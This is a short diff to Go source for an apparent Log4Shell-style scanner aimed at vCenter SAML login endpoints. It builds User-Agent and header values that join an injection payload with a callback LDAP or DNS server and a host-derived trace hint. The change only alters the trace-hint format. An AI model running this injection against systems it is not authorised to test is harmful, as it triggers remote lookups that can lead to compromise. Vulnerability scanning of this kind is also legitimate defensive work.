@@ -110,7 +110,7 @@ func ScanIPLDAPUi(Url string, serverUrl string, payload string, client *http.Cli
                 if len(redirectUrl) > 0  {
                         newUrl, _ := url.Parse(redirectUrl)
                         newTargetUrl := fmt.Sprintf("%s://%s%s?SAMLRequest=", newUrl.Scheme, newUrl.Host, newUrl.Path)
-                        traceHint := fmt.Sprintf("%s/%s_VCenter", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
+                        traceHint := fmt.Sprintf("%s_%s_VCenter", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
                         targetUserAgent := fmt.Sprintf("%s//%s/%s_User-Agent}", payload, serverUrl, traceHint)
                         targetHeader := fmt.Sprintf("%s//%s/%s}", payload, serverUrl, traceHint)
                         newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
@@ -189,7 +189,7 @@ func ScanIPDNSUi(Url string, serverUrl string, payload string, client *http.Clie
                         newUrl, _ := url.Parse(redirectUrl)
                         // newTargetUrl := newUrl.Scheme + "://" + newUrl.Host + newUrl.Path + "?" + "SAMLRequest="
                         newTargetUrl := fmt.Sprintf("%s://%s%s?SAMLRequest=", newUrl.Scheme, newUrl.Host, newUrl.Path)
-                        traceHint := fmt.Sprintf("%s/%s_VCenter", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
+                        traceHint := fmt.Sprintf("%s_%s_VCenter", strings.Replace(baseUrl.Hostname(), ".","_",4), baseUrl.Port())
                         targetUserAgent := fmt.Sprintf("%s//%s/%s_User-Agent}", payload, serverUrl, traceHint)
                         targetHeader := fmt.Sprintf("%s//%s/%s}", payload, serverUrl, traceHint)
                         newRequest, err := http.NewRequest("GET", newTargetUrl, nil)
